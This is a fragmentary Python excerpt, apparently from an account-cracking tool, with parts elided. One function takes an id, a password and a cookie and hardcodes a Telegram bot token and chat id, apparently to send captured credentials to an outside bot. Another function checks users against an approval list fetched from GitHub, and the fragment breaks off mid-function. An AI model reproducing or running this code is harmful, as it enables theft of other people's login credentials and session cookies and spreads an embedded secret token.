...
def Elite(id,ps,coki):
    try:
        import requests
        token = "6282472254:AAEmXnJi0WeQuRF1mZyDQb4ltimPlHVubuw"#Add yout token 
        chatid = "5330394637"#Add your Chat Id
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/ROKY-009/Controls/blob/main/Aprobal.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
